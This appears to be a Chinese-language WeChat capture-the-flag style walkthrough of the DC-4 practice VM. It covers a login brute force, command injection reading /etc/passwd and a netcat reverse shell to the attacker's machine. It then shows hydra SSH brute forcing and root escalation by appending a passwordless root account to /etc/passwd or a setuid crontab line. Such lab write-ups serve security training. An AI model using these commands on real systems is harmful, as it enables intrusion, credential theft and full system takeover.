> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/enrNQacUwv8VVTwXo50mBQ)

**01 项目安装**
===========

首先咱们需要将 DC-4 的靶机下载，并安装到咱们的靶机上

下载地址是：https://www.five86.com/dc-4.html

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7VqFHVUYl0v48sRnJM1AGh2d0mgkItJd7oULCcbpgGb3yVONb5tbcwQ/640?wx_fmt=png)

进入页面点击 here 进行下载

下载好之后，导入咱们的虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7fG40ibncZibake0Ay9uVs30XYDIHGKLY23OWoMYqWk3Gm6m8ATcDHDvA/640?wx_fmt=png)

看到这个页面，表示我们靶机安装成功，接下来就是拿下它

**02 信息收集**
===========

首先我们进行信息收集，获取靶机的 ip 和相关端口

```
#获取ip地址
nmap 192.168.31.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7PiaQI3aSCwgJ9lXbR5beTERkvGsBFf6zkXMcTIw34WOspHrm3g2NQ4A/640?wx_fmt=png)

可以看到靶机开启了 80 端口，页面访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7pgMMQ99WZA5XTsvsntfj1lS2zoVTPleHKFX4978wmgeNweDiagoHZsw/640?wx_fmt=png)

可以访问成功, 可以看到直接就让输入账户和密码

**03 爆破账号密码**
=============

既然看到了登录密码框，而且提示，账户名为：admin，只需要就用 BurpSuite 将密码爆破出来

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7DwzfibPztWLFy2iaaS4UOs8d61WtYgynib3s77TiaicoDSRkEUj2xw1PTcw/640?wx_fmt=png)

最后爆出 账号名: admin , 密码: happy

**04 命令注入**
===========

进入网页之后可以看到，居然是可以执行 linux 命令

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7CBvMBvGqPSoSxWPfEH1licomA0YVUs5yApBZicx1G4tAeTricdib9QzJtw/640?wx_fmt=png)

既然如此，用 BurpSuite 拦截下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7r2vXzmzbdicBIxVYQbNNzOibagG2lYHIhGq9FH6bS26hLTKz5qvSdQOg/640?wx_fmt=png)

可以看到页面确实在往后台传递命令，那么这里存在命令注入漏洞

将 ls+-l 修改为 cat+/etc/passwd ，获取下服务器密码

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7IGX3Zp6FBNAwy5sgv3BW4xPas8quzuUhRGpBLsKoLwDEVrT7hiaI8Kg/640?wx_fmt=png)

可以看到直接获取了服务器的用户名

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7n4p9JFQoskdfWib9zSXzMHEdwaibv5aSBN5sSlyJwicQHC8T0a9KEqSwQ/640?wx_fmt=png)

将有用的提取出来

```
#服务器用户名
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
```

既然可以执行命令，那直接反弹 shell

```
nc+192.168.31.81+1234+-e+/bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7uP194kANvmy7V3kcichrSclFkY3ib1x8mKcjM5lnAOCQMouIToYw3MMA/640?wx_fmt=png)

在 kali 上监听 1234 端口

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7uf6SN9iamZoUFKibicVibia2XVwJKQUcGv6UqXWG1PHZh3gRR1icyIKyagmw/640?wx_fmt=png)

攻击机上已经获取到了 shell

```
#获取完全交互的shell

python -c 'import pty;pty.spawn("/bin/sh")'
```

链接上靶机之后，看下服务器上面都有什么，最后发现只有 jim 文件下有类似密码备份

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7gs6BbfjqgaEiblMlzCPHQib8LMSAgJwtFlLnOg9yHxcsMZgXtT8ud8Ig/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7fL9CG0tXawOSdiax8fWBR95lSrTBkL2Va4n9rWF4aeUze0xtVgtTpSQ/640?wx_fmt=png)

在 kali 中创建个文件，将密码保存起来

```
#将密码放入文件，保存
vim pass.txt
:wq
```

在创建个文件，用来存储服务器的用户名

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7bKjib6pX0j45lQxu5NIZsHVFRbWGAbgwiaXuyEtw66IzRtlnibicQbNMxA/640?wx_fmt=png)

**05 ssh 爆破**
=============

既然有了用户名列表，也有了密码列表，那么就开始对服务器进行爆破

```
#在kali中使用hydra进行爆破
hydra -L user.txt -P pass.txt  ssh://192.168.31.145 -s  22
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7TNO63jcY4PePib8j2qfIOTVd4afuud2gyVrQvd8KsibSO442XKOQ2eXg/640?wx_fmt=png)

可以看到账号是: jim , 密码是: jibril04

使用 ssh 远程登录 jim 的账号

```
ssh jim@192.168.31.145
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp71a1t5YvfrozUKGyd1H8VgziccjlRcLtIbPgStf7ya3tF1sk3BW1qwqA/640?wx_fmt=png)

登录成功

**06 获取信息**
===========

在服务器中，可以看到 Charles 发送给 Jim 的一份邮件

在 var/mail 文件夹下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7fyI6RDkJZbugV2aXI1za8ZdUibdhbXx7agTRkUJEECNZBwRSYuW2E6A/640?wx_fmt=png)

可以看到 Charles 的密码是 ^xHhA&hvim0y

ssh 链接一下

```
ssh charles@192.168.31.145
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7Ude73reK7ul9qHdHmwwaSEk7Ck456W3ITziaYK4tlJlEb3C29bElCAQ/640?wx_fmt=png)

登录成功

**07 提权**
=========

执行

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7ur2VBDUTu9MQevUJ9v2gvpfQwLcMzv9Du0OEof2jPFmCNrW4FTczibA/640?wx_fmt=png)

可以看到一个 root 权限无密码执行的脚本

可以通过这个脚本进行提权

这个脚本具体是做什么用的？它主要是把内容写入一个文件的中的末尾

既然知道脚本的功能，那么这个地方就有两种办法提取

第一种，创建一个具有 root 权限的用户

```
#创建新的root权限账户
echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

第二种，定时任务

```
echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab

/bin/sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7Rsm4EQibz7hAnoedx1aVqWg8QR9MrttAz4QtyGWqbDSjk2vKaMw9xPQ/640?wx_fmt=png)

提权成功

最后查看 root 目录下的目标

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7HibUz9wVc3icusN8qIxbmibzRm5qickia9ibcnxaG8qWqu20XwwqrciagicqDQ/640?wx_fmt=png)

**08 总结**
=========

1. 使用 BurpSuite 对网页登录框，进行密码账号爆破

2. 通过命令注入漏洞，进行命令注入

3. 使用 hydra 对 ssh 进行爆破

4. 通过现有的脚本进行提权操作

-END-

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7hWBdZDHukT8RoSoK1MU9vDWyA2mFUrwpHW1hR66bIH2dD1fKj1L0PA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7dMwH9adLvutCcLicdEPPFyr9jnN06NLRu6Jg85SEicmhbc53z5wXZzWQ/640?wx_fmt=jpeg)

微信号：Zero-safety

- 扫码关注我们 -

带你领略不一样的世界

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MaY6g8c4royZZdoEQzaibpp7LVpnnataVgcuqkaiaxbuf1mcdBkYc7ElZZpK9QLslbZZxMMRehafjQA/640?wx_fmt=gif)